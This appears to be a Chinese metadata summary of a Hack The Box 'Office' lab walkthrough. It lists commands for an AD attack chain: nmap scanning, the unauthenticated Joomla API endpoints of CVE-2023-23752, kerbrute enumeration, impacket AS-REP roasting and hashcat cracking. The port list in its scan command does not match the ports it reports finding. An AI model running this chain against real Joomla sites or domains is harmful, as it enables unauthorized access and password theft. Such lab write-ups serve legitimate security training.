...
quality: medium
full_path: HTB_Office实战式打靶过程.full.md
meta_path: HTB_Office实战式打靶过程.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: HTB Office实战式打靶过程。HTB Office打靶：Joomla API未授权用户枚举。关键路径：sudo nmap -sC -sT -sV -O -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389 → echo '10.10.11.3 dc.office.htb office.htb' >> /etc/hosts ...
category: web
...
wp_url: https://www.ctfiot.com/217000.html
reasoning_chain:
- 触发点：nmap 扫到 22/80/88/389/445/464/593/636/3268/3269/5985/9389 → 假设：AD 域环境 → 动作：echo '10.10.11.3 dc.office.htb office.htb' >> /etc/hosts
- 下一步：smbclient -L //10.10.11.3/ 看共享 → 观察：Joomla 路径 → 动作：访问 /api/index.php/v1/config/application?public=true
- 触发点：CVE-2023-23752 Joomla 未授权 API 端点 → 假设：config + users 端点都 public → 动作：curl -v /api/index.php/v1/users?public=true
- 观察：拿到所有 AD 用户列表（含用户名/邮箱/组）→ 下一步：kerbrute userenum 验证有效用户
- 假设：拿到用户后爆破 AS-REP（不需要预认证）→ 动作：impacket-GetNPUsers office.htb/ -usersfile users.txt -format hashcat → 观察：拿到 TGT
- 下一步：hashcat 爆破 TGT → 动作：hashcat -m 18200 hash.txt rockyou.txt → 观察：拿到密码
failed_attempts:
- 试图直接 SMB 匿名登录 → 失败：guest 账户被禁用
- 试图 kerbrute password_spray → 失败：账号锁定策略生效
key_observations:
- Joomla /api/index.php/v1/config/application?public=true 与 /api/index.php/v1/users?public=true 是 CVE-2023-23752 的核心未授权端点
- AD 域打靶的标配顺序：端口扫描 → host 解析 → SMB/LDAP 枚举 → AS-REP 爆破 → 凭据复用
- kerbrute userenum 是 AS-REP Roasting 前置过滤，能区分有效用户与无效用户
- Joomla 暴露用户邮箱后即可进行 password spray / AS-REP Roasting，是 AD 域外网打点的经典路径
prerequisites:
- CVE-2023-23752 Joomla REST API 未授权访问
- AD 域基础（AS-REP Roasting + Kerbrute + impacket）
- Python requests + colorama 格式化输出
- nmap 脚本扫描（smb-enum-shares / ldap-rootdse）
---
# HTB Office实战式打靶过程
